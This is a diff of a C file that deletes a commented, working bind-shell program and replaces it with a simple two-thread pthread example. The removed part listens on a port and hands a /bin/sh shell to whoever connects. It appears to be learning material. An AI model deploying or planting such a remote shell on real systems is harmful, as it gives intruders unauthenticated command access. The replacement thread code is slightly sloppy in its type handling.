@@ -1,50 +1,49 @@
 /**
- TITLE: C Bind Shell Example
+ TITLE: Threads Example
  Author: Guillem Alminyana
  License: GPLv3 or Later
- Description: Accepts incoming connection and spawns shell
-
- Use: ./shell IP PORT
+ Description: Just an example to create two threads
+              and print their id
+	      
+ Compile: gcc threads.c -o threads -lpthread
+ Use: ./threads
 **/
 
 #include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+#include <pthread.h>
 
-#define MAX_CONNECTIONS 1
+/*
+ Thread Called Function
+*/
+void * Thread_Function ( void * ptr)
+{
+        unsigned int *id = (unsigned int *)ptr;				//<- id points to the value of the parameter. The Thread ID in this case
+        printf("Thread %u prints: \n",*id);				//<- And prints it
+}
 
-int main (int argc, char * argv[]) {
+int main (void)
+{
+        int ret1, ret2;
+	pthread_t thread_1, thread_2;                   		//<- ID for the threads
 
-    int port = atoi(argv[2]);                                    //<- Port toaccept connections
-    char * ip_address = argv[1];                                 //<- IP Address to listen on
-    char * const execve_params[] = {"/bin/sh", NULL};            //<- Parameters for execve syscall. Usually like this
-    char shell_to_exec[] = "/bin/sh";                            //<- Shell path to run
-    int fd_accepted_connection;                                  //<- socket for the accepted incoming connection
-    struct sockaddr_in my_sockaddr;
 
-    int my_socket = socket(AF_INET, SOCK_STREAM, 0);              //<- Create the Socket
-
-    my_sockaddr.sin_family = AF_INET;                             //<- Put required info in sockaddr_in: IPv4 Protocol
-    my_sockaddr.sin_port = htons(port);                           //   Port
-    my_sockaddr.sin_addr.s_addr = inet_addr(ip_address);          //   IP Address
-
-    bind(my_socket, (struct sockaddr *) &my_sockaddr,             //<- Bind the Connnection data to the socket,
-	 sizeof(my_sockaddr));
+	/* Create two threads. PArameter for the thread function is the thread_id 
+	   Parameters received:
+	   	- The memory address to store the thread id
+		- NULL for default thread options
+		- The name of the thread function to call
+		- Parameters for the function, in this case the address of the thread id
+	*/
 	
-    listen(my_socket, MAX_CONNECTIONS);                           //<- Listen incoming connections for the socket
-	
-    fd_accepted_connection = accept(my_socket, NULL, NULL);       //<- Accept incoming connection. Srtop until a connection in
-	                                                          // &client and &sockaddr_len can be NULL
-	
-    dup2(fd_accepted_connection, 0);                              //<- Duplicate STDIN, STDOUT and STDERR
-    dup2(fd_accepted_connection, 1);                              //   to make the shell output be redirected
-    dup2(fd_accepted_connection, 2);                              //   to the socket
+        ret1 = pthread_create(&thread_1, NULL, Thread_Function, (void *)&thread_1);
+        ret2 = pthread_create(&thread_2, NULL, Thread_Function, (void *)&thread_2);
 
-    execve(shell_to_exec, execve_params, NULL);                   //<- EXECVE syscall
+        /* Wait until both threads end */
 
-    return 0;
+        pthread_join(thread_1, NULL);
+        pthread_join(thread_2, NULL);
+
+        return 0;
 }
